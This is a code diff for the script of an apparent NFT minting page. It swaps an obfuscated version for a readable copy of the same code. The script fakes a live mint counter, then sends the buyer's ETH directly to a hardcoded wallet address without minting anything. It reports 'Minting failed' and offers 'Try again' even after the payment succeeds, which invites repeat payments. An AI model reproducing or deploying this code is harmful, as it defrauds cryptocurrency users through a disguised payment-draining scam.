@@ -1,1 +1,288 @@
-var _0x6968=["\x23\x73\x74\x61\x74\x75\x73","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72","\x23\x63\x6F\x6E\x6E\x65\x63\x74\x42\x74\x6E","\x23\x63\x68\x65\x63\x6B\x6F\x75\x74\x42\x74\x6E","\x74\x65\x78\x74","\x2E\x63\x6F\x75\x6E\x74","\x72\x65\x61\x64\x79","\x6E\x6F\x77","\x65\x6E\x2D\x55\x53","\x41\x6D\x65\x72\x69\x63\x61\x2F\x4E\x65\x77\x5F\x59\x6F\x72\x6B","\x74\x6F\x4C\x6F\x63\x61\x6C\x65\x53\x74\x72\x69\x6E\x67","\x67\x65\x74\x48\x6F\x75\x72\x73","\x67\x65\x74\x44\x61\x74\x65","\x67\x65\x74\x55\x54\x43\x48\x6F\x75\x72\x73","\x67\x65\x74\x55\x54\x43\x44\x61\x74\x65","\x2D\x20\x31\x61\x6D\x20\x45\x53\x54","\x2D\x20\x31\x61\x6D\x20\x55\x54\x43","\x2D\x20\x32\x61\x6D\x20\x45\x53\x54","\x2D\x20\x32\x61\x6D\x20\x55\x54\x43","\x2D\x20\x33\x61\x6D\x20\x45\x53\x54","\x2D\x20\x33\x61\x6D\x20\x55\x54\x43","\x2D\x20\x34\x61\x6D\x20\x45\x53\x54","\x2D\x20\x34\x61\x6D\x20\x55\x54\x43","\x2D\x20\x35\x61\x6D\x20\x45\x53\x54","\x2D\x20\x35\x61\x6D\x20\x55\x54\x43","\x2D\x20\x36\x61\x6D\x20\x45\x53\x54","\x2D\x20\x36\x61\x6D\x20\x55\x54\x43","\x2D\x20\x37\x61\x6D\x20\x45\x53\x54","\x2D\x20\x37\x61\x6D\x20\x55\x54\x43","\x2D\x20\x38\x61\x6D\x20\x45\x53\x54","\x2D\x20\x38\x61\x6D\x20\x55\x54\x43","\x2D\x20\x39\x61\x6D\x20\x45\x53\x54","\x2D\x20\x39\x61\x6D\x20\x55\x54\x43","\x2D\x20\x31\x30\x61\x6D\x20\x45\x53\x54","\x2D\x20\x31\x30\x61\x6D\x20\x55\x54\x43","\x2D\x20\x31\x31\x61\x6D\x20\x45\x53\x54","\x2D\x20\x31\x31\x61\x6D\x20\x55\x54\x43","\x2D\x20\x31\x32\x70\x6D\x20\x45\x53\x54","\x2D\x20\x31\x32\x70\x6D\x20\x55\x54\x43","\x2D\x20\x31\x70\x6D\x20\x45\x53\x54","\x2D\x20\x31\x70\x6D\x20\x55\x54\x43","\x2D\x20\x32\x70\x6D\x20\x45\x53\x54","\x2D\x20\x32\x70\x6D\x20\x55\x54\x43","\x2D\x20\x33\x70\x6D\x20\x45\x53\x54","\x2D\x20\x33\x70\x6D\x20\x55\x54\x43","\x2D\x20\x34\x70\x6D\x20\x45\x53\x54","\x2D\x20\x34\x70\x6D\x20\x55\x54\x43","\x2D\x20\x35\x70\x6D\x20\x45\x53\x54","\x2D\x20\x35\x70\x6D\x20\x55\x54\x43","\x2D\x20\x36\x70\x6D\x20\x45\x53\x54","\x2D\x20\x36\x70\x6D\x20\x55\x54\x43","\x2D\x20\x37\x70\x6D\x20\x45\x53\x54","\x2D\x20\x37\x70\x6D\x20\x55\x54\x43","\x2D\x20\x38\x70\x6D\x20\x45\x53\x54","\x2D\x20\x38\x70\x6D\x20\x55\x54\x43","\x2D\x20\x39\x70\x6D\x20\x45\x53\x54","\x2D\x20\x39\x70\x6D\x20\x55\x54\x43","\x2D\x20\x31\x30\x70\x6D\x20\x45\x53\x54","\x2D\x20\x31\x30\x70\x6D\x20\x55\x54\x43","\x2D\x20\x31\x31\x70\x6D\x20\x45\x53\x54","\x2D\x20\x31\x31\x70\x6D\x20\x55\x54\x43","\x2D\x20\x31\x32\x61\x6D\x20\x45\x53\x54","\x2D\x20\x31\x32\x61\x6D\x20\x55\x54\x43","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x64\x61\x74\x65\x64\x61\x79\x31","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x64\x61\x74\x65\x64\x61\x79\x32","\x64\x61\x74\x65\x68\x6F\x75\x72\x31","\x62\x75\x74\x74\x6F\x6E\x5B\x63\x6C\x61\x73\x73\x2A\x3D\x22\x74\x65\x78\x74\x2D\x62\x75\x74\x74\x6F\x6E\x2D\x70\x6C\x75\x73\x22\x5D","\x62\x75\x74\x74\x6F\x6E\x5B\x63\x6C\x61\x73\x73\x2A\x3D\x22\x74\x65\x78\x74\x2D\x62\x75\x74\x74\x6F\x6E\x2D\x6D\x69\x6E\x75\x73\x22\x5D","\x69\x6E\x70\x75\x74\x5B\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x5D\x5B\x69\x64\x3D\x22\x74\x6F\x74\x61\x6C\x4E\x46\x54\x22\x5D","\x23\x74\x6F\x74\x61\x6C\x45\x54\x48","\x76\x61\x6C\x75\x65","\x69\x6E\x6E\x65\x72\x54\x65\x78\x74","\x63\x6C\x69\x63\x6B","\x74\x6F\x46\x69\x78\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x65\x74\x68\x65\x72\x65\x75\x6D","\x77\x65\x62\x33","\x65\x6E\x61\x62\x6C\x65","\x57\x61\x6C\x6C\x65\x74\x20\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64\x2E\x20\x4D\x69\x6E\x74\x20\x79\x6F\x75\x72\x20\x4E\x46\x54\x73\x20\x6E\x6F\x77\x21","\x6C\x6F\x67","\x57\x61\x6C\x6C\x65\x74\x20\x61\x63\x63\x65\x73\x73\x20\x64\x65\x6E\x69\x65\x64","\x63\x75\x72\x72\x65\x6E\x74\x50\x72\x6F\x76\x69\x64\x65\x72","\x4E\x6F\x20\x4D\x65\x74\x61\x6D\x61\x73\x6B\x20\x28\x6F\x72\x20\x6F\x74\x68\x65\x72\x20\x57\x65\x62\x33\x20\x50\x72\x6F\x76\x69\x64\x65\x72\x29\x20\x69\x6E\x73\x74\x61\x6C\x6C\x65\x64","\x4D\x69\x6E\x74\x69\x6E\x67\x20\x69\x6E\x20\x70\x72\x6F\x67\x72\x65\x73\x73\x2E\x2E\x2E\x2E","\x30\x78\x33\x36\x62\x31\x34\x36\x39\x30\x34\x38\x44\x37\x44\x62\x38\x44\x45\x30\x38\x65\x32\x38\x37\x31\x33\x33\x36\x64\x66\x35\x35\x31\x66\x32\x30\x45\x35\x63\x39\x42","\x67\x65\x74\x41\x63\x63\x6F\x75\x6E\x74\x73","\x65\x74\x68","\x73\x65\x6C\x65\x63\x74\x65\x64\x41\x64\x64\x72\x65\x73\x73","\x65\x74\x68\x65\x72","\x74\x6F\x57\x65\x69","\x75\x74\x69\x6C\x73","\x4D\x69\x6E\x74\x69\x6E\x67\x20\x66\x61\x69\x6C\x65\x64","\x4D\x69\x6E\x74\x69\x6E\x67\x20\x73\x75\x63\x63\x65\x65\x64","\x54\x72\x79\x20\x61\x67\x61\x69\x6E","\x73\x65\x6E\x64\x54\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E"];const statusp=document[_0x6968[1]](_0x6968[0]);const connectBtn=document[_0x6968[1]](_0x6968[2]);const checkoutBtn=document[_0x6968[1]](_0x6968[3]);const pricePerNFT=0.2;$(document)[_0x6968[6]](function(){var _0x637ex5=7893;function _0x637ex6(){if(_0x637ex5> 8769){_0x637ex5= 0};$(_0x6968[5])[_0x6968[4]](_0x637ex5);_0x637ex5++}setInterval(_0x637ex6,793)});var DateMode=1;var TimeON=1;var datey= new Date(Date[_0x6968[7]]());var dateForUTC= new Date(Date[_0x6968[7]]());var dateyx=datey[_0x6968[10]](_0x6968[8],{timeZone:_0x6968[9]});var datej= new Date(dateyx);var datehour=datej[_0x6968[11]]();var dateday=datej[_0x6968[12]]();var datehourUTC=dateForUTC[_0x6968[13]]();var datedayUTC=dateForUTC[_0x6968[14]]();if(datehour== 1){datehour= _0x6968[15]};if(datehourUTC== 1){datehourUTC= _0x6968[16]};if(datehour== 2){datehour= _0x6968[17]};if(datehourUTC== 2){datehourUTC= _0x6968[18]};if(datehour== 3){datehour= _0x6968[19]};if(datehourUTC== 3){datehourUTC= _0x6968[20]};if(datehour== 4){datehour= _0x6968[21]};if(datehourUTC== 4){datehourUTC= _0x6968[22]};if(datehour== 5){datehour= _0x6968[23]};if(datehourUTC== 5){datehourUTC= _0x6968[24]};if(datehour== 6){datehour= _0x6968[25]};if(datehourUTC== 6){datehourUTC= _0x6968[26]};if(datehour== 7){datehour= _0x6968[27]};if(datehourUTC== 7){datehourUTC= _0x6968[28]};if(datehour== 8){datehour= _0x6968[29]};if(datehourUTC== 8){datehourUTC= _0x6968[30]};if(datehour== 9){datehour= _0x6968[31]};if(datehourUTC== 9){datehourUTC= _0x6968[32]};if(datehour== 10){datehour= _0x6968[33]};if(datehourUTC== 10){datehourUTC= _0x6968[34]};if(datehour== 11){datehour= _0x6968[35]};if(datehourUTC== 11){datehourUTC= _0x6968[36]};if(datehour== 12){datehour= _0x6968[37]};if(datehourUTC== 12){datehourUTC= _0x6968[38]};if(datehour== 13){datehour= _0x6968[39]};if(datehourUTC== 13){datehourUTC= _0x6968[40]};if(datehour== 14){datehour= _0x6968[41]};if(datehourUTC== 14){datehourUTC= _0x6968[42]};if(datehour== 15){datehour= _0x6968[43]};if(datehourUTC== 15){datehourUTC= _0x6968[44]};if(datehour== 16){datehour= _0x6968[45]};if(datehourUTC== 16){datehourUTC= _0x6968[46]};if(datehour== 17){datehour= _0x6968[47]};if(datehourUTC== 17){datehourUTC= _0x6968[48]};if(datehour== 18){datehour= _0x6968[49]};if(datehourUTC== 18){datehourUTC= _0x6968[50]};if(datehour== 19){datehour= _0x6968[51]};if(datehourUTC== 19){datehourUTC= _0x6968[52]};if(datehour== 20){datehour= _0x6968[53]};if(datehourUTC== 20){datehourUTC= _0x6968[54]};if(datehour== 21){datehour= _0x6968[55]};if(datehourUTC== 21){datehourUTC= _0x6968[56]};if(datehour== 22){datehour= _0x6968[57]};if(datehourUTC== 22){datehourUTC= _0x6968[58]};if(datehour== 23){datehour= _0x6968[59]};if(datehourUTC== 23){datehourUTC= _0x6968[60]};if(datehour== 0){datehour= _0x6968[61]};if(datehourUTC== 0){datehourUTC= _0x6968[62]};if(DateMode== 1){document[_0x6968[65]](_0x6968[64])[_0x6968[63]]= dateday;document[_0x6968[65]](_0x6968[66])[_0x6968[63]]= dateday;if(TimeON== 1){document[_0x6968[65]](_0x6968[67])[_0x6968[63]]= datehour}}else {if(DateMode== 2){document[_0x6968[65]](_0x6968[64])[_0x6968[63]]= datedayUTC;document[_0x6968[65]](_0x6968[66])[_0x6968[63]]= datedayUTC;if(TimeON== 1){document[_0x6968[65]](_0x6968[67])[_0x6968[63]]= datehourUTC}}};let plusBtn=document[_0x6968[1]](_0x6968[68]);let minusBtn=document[_0x6968[1]](_0x6968[69]);let totalNFTInput=document[_0x6968[1]](_0x6968[70]);let totalETHSpan=document[_0x6968[1]](_0x6968[71]);totalNFTInput[_0x6968[72]]= 1;totalETHSpan[_0x6968[73]]= totalNFTInput[_0x6968[72]]* pricePerNFT;plusBtn[_0x6968[76]](_0x6968[74],()=>{totalNFTInput[_0x6968[72]]= Number(totalNFTInput[_0x6968[72]])+ 1;totalETHSpan[_0x6968[73]]= (totalNFTInput[_0x6968[72]]* pricePerNFT)[_0x6968[75]](2)});minusBtn[_0x6968[76]](_0x6968[74],()=>{if(Number(totalNFTInput[_0x6968[72]])> 1){totalNFTInput[_0x6968[72]]= Number(totalNFTInput[_0x6968[72]])- 1;totalETHSpan[_0x6968[73]]= (totalNFTInput[_0x6968[72]]* pricePerNFT)[_0x6968[75]](2)}});connectBtn[_0x6968[76]](_0x6968[74],async ()=>{if(window[_0x6968[77]]){window[_0x6968[78]]=  new Web3(ethereum);try{ await ethereum[_0x6968[79]]();initPayButton();statusp[_0x6968[63]]= _0x6968[80]}catch(err){console[_0x6968[81]](err);statusp[_0x6968[63]]= _0x6968[82]}}else {if(window[_0x6968[78]]){window[_0x6968[78]]=  new Web3(web3[_0x6968[83]]);initPayButton()}else {statusp[_0x6968[63]]= _0x6968[84]}}});const initPayButton=()=>{checkoutBtn[_0x6968[76]](_0x6968[74],async ()=>{statusp[_0x6968[73]]= _0x6968[85];const _0x637ex16=_0x6968[86];let _0x637ex17=totalETHSpan[_0x6968[73]];_0x637ex17= _0x637ex17.toString();const _0x637ex18= await web3[_0x6968[88]][_0x6968[87]]();web3[_0x6968[88]][_0x6968[96]]({from:web3[_0x6968[83]][_0x6968[89]],to:_0x637ex16,value:web3[_0x6968[92]][_0x6968[91]](_0x637ex17,_0x6968[90])},(_0x637ex19,_0x637ex1a)=>{if(_0x637ex19){console[_0x6968[81]](_0x6968[93],_0x637ex19);statusp[_0x6968[73]]= _0x6968[93]}else {console[_0x6968[81]](_0x6968[94],_0x637ex1a);statusp[_0x6968[73]]= _0x6968[93];checkoutBtn[_0x6968[73]]= _0x6968[95]}})})}
+const statusp = document.querySelector("#status");
+const connectBtn = document.querySelector('#connectBtn');
+const checkoutBtn = document.querySelector('#checkoutBtn');
+//const connectBtnHeader = document.querySelector('#connectBtnHeader');
+const pricePerNFT = 0.2;
+
+  //counter
+
+    $(document).ready(function (){
+  var count = 7893;
+ function myCount() {
+ if (count > 8769) {
+     count = 0;
+ }
+ $('.count').text(count);
+ count ++;
+  
+}
+
+setInterval(myCount,793);
+});
+
+
+    //current date
+                var DateMode = 1; // 1 - EST | 2 - UTC
+                var TimeON = 1; // 1 - Enable | 2 - Off
+
+                var datey = new Date(Date.now());
+
+                var dateForUTC = new Date(Date.now());
+
+                var dateyx = datey.toLocaleString('en-US', {
+                    timeZone: 'America/New_York'
+                });
+                var datej = new Date(dateyx);
+                var datehour = datej.getHours();
+                var dateday = datej.getDate();
+
+                var datehourUTC = dateForUTC.getUTCHours();
+                var datedayUTC = dateForUTC.getUTCDate();
+
+                if (datehour == 1) {
+                    datehour = '- 1am EST'
+                }
+                if (datehourUTC == 1) {
+                    datehourUTC = '- 1am UTC'
+                }
+                if (datehour == 2) {
+                    datehour = '- 2am EST'
+                }
+                if (datehourUTC == 2) {
+                    datehourUTC = '- 2am UTC'
+                }
+                if (datehour == 3) {
+                    datehour = '- 3am EST'
+                }
+                if (datehourUTC == 3) {
+                    datehourUTC = '- 3am UTC'
+                }
+                if (datehour == 4) {
+                    datehour = '- 4am EST'
+                }
+                if (datehourUTC == 4) {
+                    datehourUTC = '- 4am UTC'
+                }
+                if (datehour == 5) {
+                    datehour = '- 5am EST'
+                }
+                if (datehourUTC == 5) {
+                    datehourUTC = '- 5am UTC'
+                }
+                if (datehour == 6) {
+                    datehour = '- 6am EST'
+                }
+                if (datehourUTC == 6) {
+                    datehourUTC = '- 6am UTC'
+                }
+                if (datehour == 7) {
+                    datehour = '- 7am EST'
+                }
+                if (datehourUTC == 7) {
+                    datehourUTC = '- 7am UTC'
+                }
+                if (datehour == 8) {
+                    datehour = '- 8am EST'
+                }
+                if (datehourUTC == 8) {
+                    datehourUTC = '- 8am UTC'
+                }
+                if (datehour == 9) {
+                    datehour = '- 9am EST'
+                }
+                if (datehourUTC == 9) {
+                    datehourUTC = '- 9am UTC'
+                }
+                if (datehour == 10) {
+                    datehour = '- 10am EST'
+                }
+                if (datehourUTC == 10) {
+                    datehourUTC = '- 10am UTC'
+                }
+                if (datehour == 11) {
+                    datehour = '- 11am EST'
+                }
+                if (datehourUTC == 11) {
+                    datehourUTC = '- 11am UTC'
+                }
+                if (datehour == 12) {
+                    datehour = '- 12pm EST'
+                }
+                if (datehourUTC == 12) {
+                    datehourUTC = '- 12pm UTC'
+                }
+                if (datehour == 13) {
+                    datehour = '- 1pm EST'
+                }
+                if (datehourUTC == 13) {
+                    datehourUTC = '- 1pm UTC'
+                }
+                if (datehour == 14) {
+                    datehour = '- 2pm EST'
+                }
+                if (datehourUTC == 14) {
+                    datehourUTC = '- 2pm UTC'
+                }
+                if (datehour == 15) {
+                    datehour = '- 3pm EST'
+                }
+                if (datehourUTC == 15) {
+                    datehourUTC = '- 3pm UTC'
+                }
+                if (datehour == 16) {
+                    datehour = '- 4pm EST'
+                }
+                if (datehourUTC == 16) {
+                    datehourUTC = '- 4pm UTC'
+                }
+                if (datehour == 17) {
+                    datehour = '- 5pm EST'
+                }
+                if (datehourUTC == 17) {
+                    datehourUTC = '- 5pm UTC'
+                }
+                if (datehour == 18) {
+                    datehour = '- 6pm EST'
+                }
+                if (datehourUTC == 18) {
+                    datehourUTC = '- 6pm UTC'
+                }
+                if (datehour == 19) {
+                    datehour = '- 7pm EST'
+                }
+                if (datehourUTC == 19) {
+                    datehourUTC = '- 7pm UTC'
+                }
+                if (datehour == 20) {
+                    datehour = '- 8pm EST'
+                }
+                if (datehourUTC == 20) {
+                    datehourUTC = '- 8pm UTC'
+                }
+                if (datehour == 21) {
+                    datehour = '- 9pm EST'
+                }
+                if (datehourUTC == 21) {
+                    datehourUTC = '- 9pm UTC'
+                }
+                if (datehour == 22) {
+                    datehour = '- 10pm EST'
+                }
+                if (datehourUTC == 22) {
+                    datehourUTC = '- 10pm UTC'
+                }
+                if (datehour == 23) {
+                    datehour = '- 11pm EST'
+                }
+                if (datehourUTC == 23) {
+                    datehourUTC = '- 11pm UTC'
+                }
+                if (datehour == 0) {
+                    datehour = '- 12am EST'
+                }
+                if (datehourUTC == 0) {
+                    datehourUTC = '- 12am UTC'
+                }
+
+                if (DateMode == 1) {
+                    document.getElementById("dateday1").innerHTML = dateday;
+                    document.getElementById("dateday2").innerHTML = dateday;
+                    if (TimeON == 1) {
+                        document.getElementById("datehour1").innerHTML = datehour;
+                    }
+                } else if (DateMode == 2) {
+                    document.getElementById("dateday1").innerHTML = datedayUTC;
+                    document.getElementById("dateday2").innerHTML = datedayUTC;
+                    if (TimeON == 1) {
+                        document.getElementById("datehour1").innerHTML = datehourUTC;
+                    }
+                }
+
+                //countdown
+               
+
+/** input number spinner
+ */
+let plusBtn = document.querySelector('button[class*="text-button-plus"]');
+let minusBtn = document.querySelector('button[class*="text-button-minus"]');
+let totalNFTInput = document.querySelector('input[type="text"][id="totalNFT"]')
+let totalETHSpan =  document.querySelector('#totalETH');
+totalNFTInput.value = 1;
+totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;
+
+plusBtn.addEventListener('click',()=>{
+  totalNFTInput.value = Number(totalNFTInput.value)  + 1;
+  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
+})
+minusBtn.addEventListener('click',()=>{
+  if (Number(totalNFTInput.value)>1) {
+    totalNFTInput.value =  Number(totalNFTInput.value) - 1;
+    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(2);
+  }
+  
+})
+//** end of input number spinner */
+
+connectBtn.addEventListener('click', async () => {
+    if (window.ethereum) {
+      window.web3 = new Web3(ethereum);
+      try {
+        await ethereum.enable();
+        initPayButton()
+        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
+      } catch (err) {
+        console.log(err)
+        statusp.innerHTML = 'Wallet access denied'
+      }
+    } else if (window.web3) {
+      window.web3 = new Web3(web3.currentProvider)
+      initPayButton()
+    } else {
+      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
+    }
+  })
+
+  /*
+  connectBtnHeader.addEventListener('click', async () => {
+    if (window.ethereum) {
+      window.web3 = new Web3(ethereum);
+      try {
+        await ethereum.enable();
+        initPayButton()
+        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
+      } catch (err) {
+        console.log(err)
+        statusp.innerHTML = 'Wallet access denied'
+      }
+    } else if (window.web3) {
+      window.web3 = new Web3(web3.currentProvider)
+      initPayButton()
+    } else {
+      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
+    }
+  }) */
+  
+  const initPayButton = () => {
+    checkoutBtn.addEventListener('click', async () => {
+      statusp.innerText = 'Minting in progress....'
+      // paymentAddress is where funds will be send to
+      const paymentAddress = '0x36b1469048D7Db8DE08e2871336df551f20E5c9B'
+      let totalEth = totalETHSpan.innerText;
+      totalEth = totalEth.toString();
+      const accounts = await web3.eth.getAccounts();
+      web3.eth.sendTransaction({
+        from: web3.currentProvider.selectedAddress,
+        to: paymentAddress,
+        value: web3.utils.toWei(totalEth, 'ether')
+        }, (err, transactionId) => {
+        if  (err) {
+          console.log('Minting failed', err)
+          statusp.innerText = 'Minting failed'
+        } else {
+          console.log('Minting succeed', transactionId)
+          statusp.innerText = 'Minting failed';
+          checkoutBtn.innerText = 'Try again'  
+        }
+      })
+    })
+  }
